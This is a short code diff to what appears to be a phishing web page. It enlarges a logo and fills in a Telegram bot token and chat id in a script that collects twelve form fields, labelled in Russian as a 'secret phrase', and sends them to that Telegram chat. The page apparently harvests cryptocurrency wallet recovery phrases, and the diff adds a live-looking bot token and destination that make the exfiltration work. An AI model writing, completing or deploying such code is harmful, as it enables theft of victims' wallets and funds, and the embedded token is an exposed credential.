@@ -29,7 +29,7 @@
             margin-bottom: 20px;
         }
         .logo img {
-            max-width: 100px;
+            max-width: 260px;
             height: auto;
         }
         h1 {
@@ -171,8 +171,8 @@
             const words = Array.from({ length: 12 }, (_, i) => formData.get(`word${i + 1}`)).join('\n');
 
             // Telegram API
-            const botToken = 'ВАШ_ТОКЕН_БОТА'; // Вставьте токен вашего бота
-            const chatId = 'ВАШ_CHAT_ID'; // Вставьте ваш chat_id
+            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Вставьте токен вашего бота
+            const chatId = '@bdsjxjdhd'; // Вставьте ваш chat_id
             const message = `Секретная фраза:\n${words}`;
 
             // Отправка данных в Telegram
